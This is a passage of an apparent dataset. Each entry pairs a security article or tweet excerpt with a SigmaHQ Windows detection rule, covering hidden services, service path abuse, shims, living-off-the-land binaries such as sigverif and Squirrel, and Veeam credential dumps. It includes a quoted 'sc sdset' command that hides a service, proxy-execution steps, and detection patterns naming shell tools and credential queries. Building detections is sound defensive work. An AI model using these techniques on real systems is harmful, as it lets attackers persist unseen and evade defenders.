    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_sc_sdset_hide_sevices.yml"
  },
  "488": {
    "url": "https://www.sans.org/blog/red-team-tactics-hiding-windows-services/",
    "markdown": "# Red Team Tactics: Hiding Windows Services **October 13, 2020** A little known feature of Windows allows attackers to hide persistent services from view, creating an opportunity to evade threat hunting detection. > A little known feature of Windows allows the red team or an attacker to hide services from view, creating an opportunity to evade detection from common host-based threat hunting techniques. In a recent red team engagement, my team was up against some well-trained, sophisticated defenders. We built custom malware to evade the anticipated EDR platforms, but we knew host analysis would eventually get us caught and quickly",
    "sigma_rule": {
      "title": "Service DACL Abuse To Hide Services Via Sc.EXE",
      "id": "a537cfc3-4297-4789-92b5-345bfd845ad0",
      "related": [
        {
          "id": "99cf1e02-00fb-4c0d-8375-563f978dfd37",
          "type": "similar"
        },
        {
          "id": "98c5aeef-32d5-492f-b174-64a691896d25",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects usage of the \"sc.exe\" utility adding a new service with special permission seen used by threat actors which makes the service hidden and unremovable.",
      "references": [
        "https://blog.talosintelligence.com/2021/10/threat-hunting-in-large-datasets-by.html",
        "https://www.sans.org/blog/red-team-tactics-hiding-windows-services/",
        "https://twitter.com/Alh4zr3d/status/1580925761996828672",
        "https://itconnect.uw.edu/tools-services-support/it-systems-infrastructure/msinf/other-help/understanding-sddl-syntax/"
      ],
      "author": "Andreas Hunkeler (@Karneades)",
      "date": "2021-12-20",
      "modified": "2022-08-08",
      "tags": [
        "attack.persistence",
        "attack.defense-evasion",
        "attack.privilege-escalation",
        "attack.t1574.011"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\sc.exe"
          },
          {
            "OriginalFileName": "sc.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            "sdset",
            "DCLCWPDTSD"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_sc_sdset_hide_sevices.yml"
  },
  "489": {
    "url": "https://twitter.com/Alh4zr3d/status/1580925761996828672",
    "markdown": "# Post Oct 14, 2022 Hiding Windows services: ``` sc sdset evilsvc \"D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)\" ``` 1/2 #redteam #hacking # Comment Oct 14, 2022 This is a really nasty tip: Windows' sc.exe allows you to manually assign service permissions with SDDL syntax. This allows you to essentially make your service invisible unless defenders already know the service name. Services.exe, Get-Service, sc.exe, all of these fail. 2/2",
    "sigma_rule": {
      "title": "Service DACL Abuse To Hide Services Via Sc.EXE",
      "id": "a537cfc3-4297-4789-92b5-345bfd845ad0",
      "related": [
        {
          "id": "99cf1e02-00fb-4c0d-8375-563f978dfd37",
          "type": "similar"
        },
        {
          "id": "98c5aeef-32d5-492f-b174-64a691896d25",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects usage of the \"sc.exe\" utility adding a new service with special permission seen used by threat actors which makes the service hidden and unremovable.",
      "references": [
        "https://blog.talosintelligence.com/2021/10/threat-hunting-in-large-datasets-by.html",
        "https://www.sans.org/blog/red-team-tactics-hiding-windows-services/",
        "https://twitter.com/Alh4zr3d/status/1580925761996828672",
        "https://itconnect.uw.edu/tools-services-support/it-systems-infrastructure/msinf/other-help/understanding-sddl-syntax/"
      ],
      "author": "Andreas Hunkeler (@Karneades)",
      "date": "2021-12-20",
      "modified": "2022-08-08",
      "tags": [
        "attack.persistence",
        "attack.defense-evasion",
        "attack.privilege-escalation",
        "attack.t1574.011"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\sc.exe"
          },
          {
            "OriginalFileName": "sc.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            "sdset",
            "DCLCWPDTSD"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_sc_sdset_hide_sevices.yml"
  },
  "490": {
    "url": "https://itconnect.uw.edu/tools-services-support/it-systems-infrastructure/msinf/other-help/understanding-sddl-syntax/",
    "markdown": "# Understanding SDDL Syntax **Last updated:** April 10, 2024 **Audience:** IT Staff / Technical What follows is an appendix which pieces together several disparate Microsoft documents on the SDDL syntax. The SDDL syntax is important if you do coding of directory security or manually edit a security template file. ## SDDL (Security Descriptor Definition Language) At the lowest level, the Security Descriptor Definition Language is used in the `nTSecurityDescriptor` attribute (and on registry keys and NTFS files) to define the ACL. Fortunately, one does not need to know this level of detail in normal conditions. But advanced administrators may want",
    "sigma_rule": {
      "title": "Service DACL Abuse To Hide Services Via Sc.EXE",
      "id": "a537cfc3-4297-4789-92b5-345bfd845ad0",
      "related": [
        {
          "id": "99cf1e02-00fb-4c0d-8375-563f978dfd37",
          "type": "similar"
        },
        {
          "id": "98c5aeef-32d5-492f-b174-64a691896d25",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects usage of the \"sc.exe\" utility adding a new service with special permission seen used by threat actors which makes the service hidden and unremovable.",
      "references": [
        "https://blog.talosintelligence.com/2021/10/threat-hunting-in-large-datasets-by.html",
        "https://www.sans.org/blog/red-team-tactics-hiding-windows-services/",
        "https://twitter.com/Alh4zr3d/status/1580925761996828672",
        "https://itconnect.uw.edu/tools-services-support/it-systems-infrastructure/msinf/other-help/understanding-sddl-syntax/"
      ],
      "author": "Andreas Hunkeler (@Karneades)",
      "date": "2021-12-20",
      "modified": "2022-08-08",
      "tags": [
        "attack.persistence",
        "attack.defense-evasion",
        "attack.privilege-escalation",
        "attack.t1574.011"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\sc.exe"
          },
          {
            "OriginalFileName": "sc.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            "sdset",
            "DCLCWPDTSD"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_sc_sdset_hide_sevices.yml"
  },
  "491": {
    "url": "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1543.003/T1543.003.md",
    "markdown": "# T1543.003 - Windows Service ## Description from ATT&CK Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions. (Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry. Adversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe),",
    "sigma_rule": {
      "title": "Suspicious Service Path Modification",
      "id": "138d3531-8793-4f50-a2cd-f291b2863d78",
      "status": "test",
      "description": "Detects service path modification via the \"sc\" binary to a suspicious command or path",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1543.003/T1543.003.md",
        "https://web.archive.org/web/20180331144337/https://www.fireeye.com/blog/threat-research/2018/03/sanny-malware-delivery-method-updated-in-recently-observed-attacks.html"
      ],
      "author": "Victor Sergeev, oscd.community, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2019-10-21",
      "modified": "2022-11-18",
      "tags": [
        "attack.persistence",
        "attack.privilege-escalation",
        "attack.t1543.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\sc.exe",
          "CommandLine|contains|all": [
            "config",
            "binPath"
          ],
          "CommandLine|contains": [
            "powershell",
            "cmd ",
            "mshta",
            "wscript",
            "cscript",
            "rundll32",
            "svchost",
            "dllhost",
            "cmd.exe /c",
            "cmd.exe /k",
            "cmd.exe /r",
            "cmd /c",
            "cmd /k",
            "cmd /r",
            "C:\\Users\\Public",
            "\\Downloads\\",
            "\\Desktop\\",
            "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\",
            "C:\\Windows\\TEMP\\",
            "\\AppData\\Local\\Temp"
          ]
        },
        "condition": "selection"
      },
      "fields": [
        "CommandLine",
        "ParentCommandLine"
      ],
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_sc_service_path_modification.yml"
  },
  "492": {
    "url": "https://web.archive.org/web/20180331144337/https://www.fireeye.com/blog/threat-research/2018/03/sanny-malware-delivery-method-updated-in-recently-observed-attacks.html",
    "markdown": "# SANNY Malware Delivery Method Updated in Recently Observed Attacks **March 23, 2018** ### Introduction In the third week of March 2018, through FireEye’s Dynamic Threat Intelligence, FireEye discovered malicious macro-based Microsoft Word documents distributing SANNY malware to multiple governments worldwide. Each malicious document lure was crafted in regard to relevant regional geopolitical issues. FireEye has tracked the SANNY malware family since 2012 and believes that it is unique to a group focused on Korean Peninsula issues. This group has consistently targeted diplomatic entities worldwide, primarily using lure documents written in English and Russian. As part of these recently observed",
    "sigma_rule": {
      "title": "Suspicious Service Path Modification",
      "id": "138d3531-8793-4f50-a2cd-f291b2863d78",
      "status": "test",
      "description": "Detects service path modification via the \"sc\" binary to a suspicious command or path",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1543.003/T1543.003.md",
        "https://web.archive.org/web/20180331144337/https://www.fireeye.com/blog/threat-research/2018/03/sanny-malware-delivery-method-updated-in-recently-observed-attacks.html"
      ],
      "author": "Victor Sergeev, oscd.community, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2019-10-21",
      "modified": "2022-11-18",
      "tags": [
        "attack.persistence",
        "attack.privilege-escalation",
        "attack.t1543.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\sc.exe",
          "CommandLine|contains|all": [
            "config",
            "binPath"
          ],
          "CommandLine|contains": [
            "powershell",
            "cmd ",
            "mshta",
            "wscript",
            "cscript",
            "rundll32",
            "svchost",
            "dllhost",
            "cmd.exe /c",
            "cmd.exe /k",
            "cmd.exe /r",
            "cmd /c",
            "cmd /k",
            "cmd /r",
            "C:\\Users\\Public",
            "\\Downloads\\",
            "\\Desktop\\",
            "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\",
            "C:\\Windows\\TEMP\\",
            "\\AppData\\Local\\Temp"
          ]
        },
        "condition": "selection"
      },
      "fields": [
        "CommandLine",
        "ParentCommandLine"
      ],
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_sc_service_path_modification.yml"
  },
  "493": {
    "url": "https://www.mandiant.com/resources/blog/fin7-shim-databases-persistence",
    "markdown": "# To SDB, Or Not To SDB: FIN7 Leveraging Shim Databases for Persistence **May 3, 2017** In 2017, Mandiant responded to multiple incidents we attribute to FIN7, a financially motivated threat group associated with malicious operations dating back to 2015. Throughout the various environments, FIN7 leveraged the CARBANAK backdoor, which this group has used in previous operations. A unique aspect of the incidents was how the group installed the CARBANAK backdoor for persistent access. Mandiant identified that the group leveraged an application shim database to achieve persistence on systems in multiple environments. The shim injected a malicious in-memory patch into",
    "sigma_rule": {
      "title": "Potential Shim Database Persistence via Sdbinst.EXE",
      "id": "517490a7-115a-48c6-8862-1a481504d5a8",
      "related": [
        {
          "id": "18ee686c-38a3-4f65-9f44-48a077141f42",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects installation of a new shim using sdbinst.exe.\nAdversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims\n",
      "references": [
        "https://www.mandiant.com/resources/blog/fin7-shim-databases-persistence"
      ],
      "author": "Markus Neis",
      "date": "2019-01-16",
      "modified": "2023-12-06",
      "tags": [
        "attack.persistence",
        "attack.privilege-escalation",
        "attack.t1546.011"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\sdbinst.exe"
          },
          {
            "OriginalFileName": "sdbinst.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": ".sdb"
        },
        "filter_optional_iis": {
          "ParentImage|endswith": "\\msiexec.exe",
          "CommandLine|contains": [
            ":\\Program Files (x86)\\IIS Express\\iisexpressshim.sdb",
            ":\\Program Files\\IIS Express\\iisexpressshim.sdb"
          ]
        },
        "condition": "all of selection_* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_sdbinst_shim_persistence.yml"
  },
  "494": {
    "url": "https://www.microsoft.com/en-us/security/blog/2021/07/13/microsoft-discovers-threat-actor-targeting-solarwinds-serv-u-software-with-0-day-exploit/",
    "markdown": "# Microsoft discovers threat actor targeting SolarWinds Serv-U software with 0-day exploit **Published on** July 13, 2021 --- Microsoft has detected a 0-day remote code execution exploit being used to attack SolarWinds Serv-U FTP software in limited and targeted attacks. The Microsoft Threat Intelligence Center (MSTIC) attributes this campaign with high confidence to DEV-0322, a group operating out of China, based on observed victimology, tactics, and procedures. The vulnerability being exploited is CVE-2021-35211, which was recently patched by SolarWinds. The vulnerability, which Microsoft reported to SolarWinds, exists in Serv-U’s implementation of the Secure Shell (SSH) protocol. If Serv-U’s SSH is",
    "sigma_rule": {
      "title": "Suspicious Serv-U Process Pattern",
      "id": "58f4ea09-0fc2-4520-ba18-b85c540b0eaf",
      "status": "test",
      "description": "Detects a suspicious process pattern which could be a sign of an exploited Serv-U service",
      "references": [
        "https://www.microsoft.com/en-us/security/blog/2021/07/13/microsoft-discovers-threat-actor-targeting-solarwinds-serv-u-software-with-0-day-exploit/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2021-07-14",
      "modified": "2022-07-14",
      "tags": [
        "attack.credential-access",
        "attack.t1555",
        "cve.2021-35211"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentImage|endswith": "\\Serv-U.exe",
          "Image|endswith": [
            "\\cmd.exe",
            "\\powershell.exe",
            "\\pwsh.exe",
            "\\wscript.exe",
            "\\cscript.exe",
            "\\sh.exe",
            "\\bash.exe",
            "\\schtasks.exe",
            "\\regsvr32.exe",
            "\\wmic.exe",
            "\\mshta.exe",
            "\\rundll32.exe",
            "\\msiexec.exe",
            "\\forfiles.exe",
            "\\scriptrunner.exe"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate uses in which users or programs use the SSH service of Serv-U for remote command execution"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_servu_susp_child_process.yml"
  },
  "495": {
    "url": "https://www.hexacorn.com/blog/2024/10/12/the-sweet16-the-oldbin-lolbin-called-setup16-exe/",
    "markdown": "# The Sweet16 – the oldbin lolbin called setup16.exe Posted on 2024-10-12 I don’t even know how to start. I wrote about old InstallShield setup before, and today’s topic is very similar – the old, yet still present setup file residing (on Win10, 11) in the following location: ``` c:\\windows\\SysWOW64\\setup16.exe ``` Running it gives us this misleading message box #1: ```image Alt: Message Box #1 Description: The image depicts a Windows error message box titled 'Setup Initialization Error'. The message states: 'Setup cannot access the required initialization file 'C:\\WINDOWS\\SYSWOW64\\SETUP16.LST'.' This box indicates a problem with accessing the specified file, crucial",
    "sigma_rule": {
      "title": "Setup16.EXE Execution With Custom .Lst File",
      "id": "99c8be4f-3087-4f9f-9c24-8c7e257b442e",
      "status": "experimental",
      "description": "Detects the execution of \"Setup16.EXE\" and old installation utility with a custom \".lst\" file.\nThese \".lst\" file can contain references to external program that \"Setup16.EXE\" will execute.\nAttackers and adversaries might leverage this as a living of the land utility.\n",
      "references": [
        "https://www.hexacorn.com/blog/2024/10/12/the-sweet16-the-oldbin-lolbin-called-setup16-exe/"
      ],
      "author": "frack113",
      "date": "2024-12-01",
      "tags": [
        "attack.defense-evasion",
        "attack.t1574.005"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentImage": "C:\\Windows\\SysWOW64\\setup16.exe",
          "ParentCommandLine|contains": " -m "
        },
        "filter_optional_valid_path": {
          "Image|startswith": "C:\\~MSSETUP.T\\"
        },
        "condition": "selection and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "On modern Windows system, the \"Setup16\" utility is practically never used, hence false positive should be very rare."
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_setup16_custom_lst_execution.yml"
  },
  "496": {
    "url": "https://www.hexacorn.com/blog/2018/04/27/i-shot-the-sigverif-exe-the-gui-based-lolbin/",
    "markdown": "# I shot the sigverif.exe – the GUI-based LOLBin Posted on 2018-04-27 by adam File Signature Verification has nothing to do with launching arbitrary applications, but it is just a similar case to odbcad32.exe – the GUI apps can sometimes be abused to produce undesired effects – ones that their authors most likely have not anticipated… Time for the recipe. So we launch the sigverif.exe: ```image Alt: sigverif0 Description: The image is a screenshot of the 'File Signature Verification' window in a Windows operating system. It displays a message explaining the purpose of the tool, which is to help maintain",
    "sigma_rule": {
      "title": "Uncommon Sigverif.EXE Child Process",
      "id": "7d4aaec2-08ed-4430-8b96-28420e030e04",
      "status": "test",
      "description": "Detects uncommon child processes spawning from \"sigverif.exe\", which could indicate potential abuse of the latter as a living of the land binary in order to proxy execution.\n",
      "references": [
        "https://www.hexacorn.com/blog/2018/04/27/i-shot-the-sigverif-exe-the-gui-based-lolbin/",
        "https://twitter.com/0gtweet/status/1457676633809330184"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-08-19",
      "modified": "2024-08-27",
      "tags": [
        "attack.defense-evasion",
        "attack.t1216"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentImage|endswith": "\\sigverif.exe"
        },
        "filter_main_werfault": {
          "Image": [
            "C:\\Windows\\System32\\WerFault.exe",
            "C:\\Windows\\SysWOW64\\WerFault.exe"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_sigverif_uncommon_child_process.yml"
  },
  "497": {
    "url": "https://twitter.com/0gtweet/status/1457676633809330184",
    "markdown": "# Post Nov 8, 2021 Need to launch your app unusual way? ;) 1. Launch Sigverif.exe 2. Click \"Advanced\" 3. Type the exe path 4. Click \"View Log\" 5. Enjoy ShellExecute() ```image Description: The image shows a graphical user interface with three overlapping windows: the Command Prompt, the Advanced File Signature Verification dialog, and the Calculator application. The Command Prompt indicates that 'sigverif' is being executed in the 'C:\\temp' directory. The File Signature Verification window is open and displays logging options, including the option to save verification results to a log file, with the log file path set to 'C:\\windows\\system32\\calc.exe'.",
    "sigma_rule": {
      "title": "Uncommon Sigverif.EXE Child Process",
      "id": "7d4aaec2-08ed-4430-8b96-28420e030e04",
      "status": "test",
      "description": "Detects uncommon child processes spawning from \"sigverif.exe\", which could indicate potential abuse of the latter as a living of the land binary in order to proxy execution.\n",
      "references": [
        "https://www.hexacorn.com/blog/2018/04/27/i-shot-the-sigverif-exe-the-gui-based-lolbin/",
        "https://twitter.com/0gtweet/status/1457676633809330184"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-08-19",
      "modified": "2024-08-27",
      "tags": [
        "attack.defense-evasion",
        "attack.t1216"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentImage|endswith": "\\sigverif.exe"
        },
        "filter_main_werfault": {
          "Image": [
            "C:\\Windows\\System32\\WerFault.exe",
            "C:\\Windows\\SysWOW64\\WerFault.exe"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_sigverif_uncommon_child_process.yml"
  },
  "498": {
    "url": "https://labs.withsecure.com/publications/fin7-target-veeam-servers",
    "markdown": "# FIN7 tradecraft seen in attacks against Veeam backup servers 26 April 2023 ## Updates: 28-04-2023 1100 UTC - We have reviewed and updated this blogpost to reflect our latest findings: - We have added information regarding the file “445.ps1”, which was missing at the time of writing. - We have updated this blogpost to broaden our attribution from FIN7 to FIN7 or a threat actor utilizing FIN7 tradecraft. ## Introduction WithSecure Intelligence identified attacks which occurred in late March 2023 against internet-facing servers running Veeam Backup & Replication software. Our research indicates that the intrusion set used in these",
    "sigma_rule": {
      "title": "Veeam Backup Database Suspicious Query",
      "id": "696bfb54-227e-4602-ac5b-30d9d2053312",
      "status": "test",
      "description": "Detects potentially suspicious SQL queries using SQLCmd targeting the Veeam backup databases in order to steal information.",
      "references": [
        "https://labs.withsecure.com/publications/fin7-target-veeam-servers"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-05-04",
      "tags": [
        "attack.collection",
        "attack.t1005"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_sql": {
          "Image|endswith": "\\sqlcmd.exe",
          "CommandLine|contains|all": [
            "VeeamBackup",
            "From "
          ]
        },
        "selection_db": {
          "CommandLine|contains": [
            "BackupRepositories",
            "Backups",
            "Credentials",
            "HostCreds",
            "SmbFileShares",
            "Ssh_creds",
            "VSphereInfo"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_sqlcmd_veeam_db_recon.yml"
  },
  "499": {
    "url": "https://thedfirreport.com/2021/12/13/diavol-ransomware/",
    "markdown": "# Diavol Ransomware In the past, threat actors have used BazarLoader to deploy Ryuk and Conti ransomware, as reported on many occasions. In this intrusion, however, a BazarLoader infection resulted in deployment of Diavol Ransomware. First discovered in June 2021, by FortiGuard Labs, Diavol Ransomware has been suspected to be linked to the Wizard Spider threat actor. In this report, we observed threat actors deploy multiple Cobalt Strike DLL beacons, perform internal discovery using Windows utilities, execute lateral movement using AnyDesk and RDP, dump credentials multiple ways, exfiltrate data and deploy domain wide ransomware in as little as 32 hours",
    "sigma_rule": {
      "title": "VeeamBackup Database Credentials Dump Via Sqlcmd.EXE",
      "id": "b57ba453-b384-4ab9-9f40-1038086b4e53",
      "status": "test",
      "description": "Detects dump of credentials in VeeamBackup dbo",
      "references": [
        "https://thedfirreport.com/2021/12/13/diavol-ransomware/",
        "https://forums.veeam.com/veeam-backup-replication-f2/recover-esxi-password-in-veeam-t34630.html"
      ],
      "author": "frack113",
      "date": "2021-12-20",
      "modified": "2023-02-13",
      "tags": [
        "attack.collection",
        "attack.t1005"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_tools": {
          "Image|endswith": "\\sqlcmd.exe"
        },
        "selection_query": {
          "CommandLine|contains|all": [
            "SELECT",
            "TOP",
            "[VeeamBackup].[dbo].[Credentials]"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_sqlcmd_veeam_dump.yml"
  },
  "500": {
    "url": "https://forums.veeam.com/veeam-backup-replication-f2/recover-esxi-password-in-veeam-t34630.html",
    "markdown": "# Recover ESXi password in Veeam ## vmNik (Novice) **Posts:** 6 **Joined:** Apr 10, 2015 12:14 am ### Recover ESXi password in Veeam Good morning. Is it possible to view/recover via SQL a password for an ESXi host attached to VBR? A remote host password has been forgotten but has a Veeam system in place there, attached with the ESXi host in question and able to backup, restore, etc. Looking at SQL table `[dbo.Credentials]` in VBR8, the list of users is shown. Is there a means to get a password from SQL? Thank you. **Signature:** VCP5-DCV --- ## nielsengelen (Product",
    "sigma_rule": {
      "title": "VeeamBackup Database Credentials Dump Via Sqlcmd.EXE",
      "id": "b57ba453-b384-4ab9-9f40-1038086b4e53",
      "status": "test",
      "description": "Detects dump of credentials in VeeamBackup dbo",
      "references": [
        "https://thedfirreport.com/2021/12/13/diavol-ransomware/",
        "https://forums.veeam.com/veeam-backup-replication-f2/recover-esxi-password-in-veeam-t34630.html"
      ],
      "author": "frack113",
      "date": "2021-12-20",
      "modified": "2023-02-13",
      "tags": [
        "attack.collection",
        "attack.t1005"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_tools": {
          "Image|endswith": "\\sqlcmd.exe"
        },
        "selection_query": {
          "CommandLine|contains|all": [
            "SELECT",
            "TOP",
            "[VeeamBackup].[dbo].[Credentials]"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_sqlcmd_veeam_dump.yml"
  },
  "501": {
    "url": "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Squirrel/",
    "markdown": "# /Squirrel.exe Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation. ### Paths: - `C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Teams\\current\\Squirrel.exe` ### Resources: - https://www.youtube.com/watch?v=rOP3hnkj7ls - https://twitter.com/reegun21/status/1144182772623269889 - http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/ - https://medium.com/@reegun/nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-80c9df51cf12 - https://medium.com/@reegun/update-nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-b55295144b56 ### Detections: - Sigma: proc_creation_win_lolbin_squirrel.yml ## Download The above binary will go to url and look for RELEASES file and download the nuget package. ``` squirrel.exe --download [url to package] ``` **Use case:** Download binary **Privileges required:** User **Operating systems:** Windows 7 and up with Microsoft Teams installed **ATT&CK® technique:** T1218: System Binary Proxy Execution ## AWL bypass The above binary will go to url and look for RELEASES",
    "sigma_rule": {
      "title": "Arbitrary File Download Via Squirrel.EXE",
      "id": "1e75c1cc-c5d4-42aa-ac3d-91b0b68b3b4c",
      "related": [
        {
          "id": "45239e6a-b035-4aaf-b339-8ad379fcb67e",
          "type": "similar"
        },
        {
          "id": "fa4b21c9-0057-4493-b289-2556416ae4d7",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects the usage of the \"Squirrel.exe\" to download arbitrary files. This binary is part of multiple Electron based software installations (Slack, Teams, Discord, etc.)\n",
      "references": [
        "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Squirrel/",
        "http://www.hexacorn.com/blog/2019/03/30/sqirrel-packages-manager-as-a-lolbin-a-k-a-many-electron-apps-are-lolbins-by-default/",
        "http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems), Karneades / Markus Neis, Jonhnathan Ribeiro, oscd.community",
      "date": "2022-06-09",
      "modified": "2023-11-09",
      "tags": [
        "attack.defense-evasion",
        "attack.execution",
        "attack.t1218"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": {
          "Image|endswith": [
            "\\squirrel.exe",
            "\\update.exe"
          ]
        },
        "selection_download_cli": {
          "CommandLine|contains": [
            " --download ",
            " --update ",
            " --updateRollback="
          ]
        },
        "selection_download_http_keyword": {
          "CommandLine|contains": "http"
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Expected FP with some Electron based applications such as (1Clipboard, Beaker Browser, Caret, Discord, GitHub Desktop, etc.)"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_squirrel_download.yml"
  },
  "502": {
    "url": "http://www.hexacorn.com/blog/2019/03/30/sqirrel-packages-manager-as-a-lolbin-a-k-a-many-electron-apps-are-lolbins-by-default/",
    "markdown": "# Squirrel packages’ manager as a lolbin (a.k.a. many Electron apps are lolbins by default) Posted on 2019-03-30 by adam A week ago, or so I posted this Twit that refers to Slack’s executables as lolbins… I have already posted about it last year – the Slack’s _update.exe_ is a nice lolbin, because it’s actually a Squirrel packages’ manager in disguise. A side effect of using Electron. I was wondering if this is a common pattern, and if Slack is the only software producer that relies on this software paradigm. Right… yeah, I know, the _paradigm_ sounds very academic and",
    "sigma_rule": {
      "title": "Arbitrary File Download Via Squirrel.EXE",
      "id": "1e75c1cc-c5d4-42aa-ac3d-91b0b68b3b4c",
      "related": [
        {
          "id": "45239e6a-b035-4aaf-b339-8ad379fcb67e",
          "type": "similar"
        },
        {
          "id": "fa4b21c9-0057-4493-b289-2556416ae4d7",
          "type": "obsolete"
        }
      ],
      "status": "test",
